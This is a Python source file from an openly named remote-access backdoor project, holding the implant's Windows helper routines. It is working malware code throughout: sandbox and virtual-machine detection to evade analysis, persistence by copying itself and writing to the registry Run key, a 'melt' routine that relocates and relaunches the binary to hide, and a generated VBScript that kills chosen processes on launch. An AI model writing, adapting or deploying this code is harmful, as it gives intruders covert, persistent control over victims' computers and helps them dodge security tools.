"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import ctypes
import shutil
import subprocess
import time
import winreg

import win32api
import win32event
import winerror
import wmi

from src.defs import *


def is_duplicate_instance():
    mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        return True

    return False


def detect_sandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detect_vm():
    _wmi = wmi.WMI()
    for objDiskDrive in _wmi.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False


def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, REG_STARTUP_NAME)
        winreg.CloseKey(key)
    except FileNotFoundError:
        raise Exception("Program is not registered in startup.")
    except WindowsError as e:
        raise Exception(f"Error removing value {e}")


def add_startup():
    try:
        app_path = os.path.join(COPY_LOCATION, os.path.basename(FILE_PATH))
        if not os.getcwd() == COPY_LOCATION:
            shutil.copyfile(FILE_PATH, app_path)

        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(regkey, REG_STARTUP_NAME, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(regkey)
    except WindowsError as e:
        raise Exception(f"Unable to add to startup {e}")


def melt():
    path = os.path.join(TMP, MELT_FOLDER_NAME)
    # ignore if the path is in copy folder as well
    if not (os.getcwd() == path) and not (os.getcwd() == COPY_LOCATION):
        try:
            os.mkdir(path)
        except Exception:         # if folder already exists
            pass

        new_file = os.path.join(path, os.path.basename(sys.argv[0]))

        command = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {new_file} & cd /d {path}\\ & {new_file}"
        subprocess.Popen(command, shell=True)
        sys.exit(0)


def vbs_block_process(process, popup=None):
    # VBScript to block process, this allows the script to disconnect from the original python process
    # popup: list
    # [message, title, timeout, type]

    vbs = "On Error Resume Next\n" + \
          "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
          "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
          "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
          "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
          "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
          f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
          "objLatestProcess.TargetInstance.Terminate\n"
    if popup is not None:  # if showing a message
        vbs += f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'

    vbs += "End If\nLoop"

    # script name will be nano timecode
    script = os.path.join(TMP, f"{time.time() * 1000000000}.vbs")

    with open(script, "w") as file:
        file.write(vbs)

    subprocess.Popen(["cscript", script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                     shell=True)
